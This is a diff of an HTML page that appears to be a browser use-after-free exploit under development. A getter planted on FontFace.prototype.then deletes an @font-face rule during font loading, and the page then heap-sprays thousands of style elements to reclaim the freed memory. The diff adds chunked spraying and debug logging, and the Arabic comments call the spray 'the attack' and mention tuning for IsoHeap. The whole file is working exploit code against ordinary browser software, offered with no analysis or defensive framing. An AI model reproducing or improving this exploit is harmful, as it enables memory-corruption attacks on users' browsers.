@@ -1,32 +1,49 @@
-<script>
-    let sprayedCSS = [];
+<!DOCTYPE html>
+<html>
+<head>
+    <style>body { background: #000; color: #0f0; font-family: monospace; }</style>
+    <style id="fontStyle">@font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }</style>
+</head>
+<body>
+    <div id="debug">System Ready...</div>
 
-    function trigger() {
-        // إنشاء عنصر DOM وسيط لاستخدامه كـ "مُشغل" (Trigger)
-        let div = document.createElement('div');
-        document.body.appendChild(div);
+    <script>
+        const debug = document.getElementById('debug');
+        function log(msg) { debug.innerText += "\n[+] " + msg; }
 
-        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
-        document.fonts.add(font);
+        function trigger() {
+            log("UAF Triggering...");
+            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(font);
 
-        Object.defineProperty(FontFace.prototype, 'then', {
-            get() {
-                // 1. الحذف
-                document.getElementById('fontStyle').sheet.deleteRule(0);
-                
-                // 2. الهجوم: إنشاء كائنات CSS مكثفة (أكثر توافقاً مع IsoHeap)
-                for (let i = 0; i < 3000; i++) {
-                    // ننشئ كائنات CSS حقيقية، هي أقرب في الذاكرة لـ CSSFontFace
-                    let s = document.createElement('style');
-                    s.textContent = '.a' + i + '{color:red}';
-                    document.head.appendChild(s);
-                    sprayedCSS.push(s);
+            Object.defineProperty(FontFace.prototype, 'then', {
+                get() {
+                    document.getElementById('fontStyle').sheet.deleteRule(0);
+                    log("Rule deleted. Chunked Spray initiating...");
+                    
+                    // تحسين: استخدام دالة مجزأة لمنع الشاشة البيضاء (التعليق)
+                    let chunk = 0;
+                    function doSpray() {
+                        if (chunk < 50) { // 50 دفعة
+                            for (let i = 0; i < 100; i++) { // 100 عنصر في الدفعة
+                                let s = document.createElement('style');
+                                s.textContent = '.a{color:red}';
+                                document.head.appendChild(s);
+                            }
+                            chunk++;
+                            setTimeout(doSpray, 10); // وقت بسيط للمعالجة
+                        } else {
+                            log("Spray complete. Check logic status.");
+                        }
+                    }
+                    doSpray();
+                    return undefined;
                 }
-                return undefined;
-            }
-        });
-        font.load();
-    }
+            });
+            font.load();
+        }
 
-    setTimeout(trigger, 1000);
-</script>
+        setTimeout(trigger, 1000);
+    </script>
+</body>
+</html>
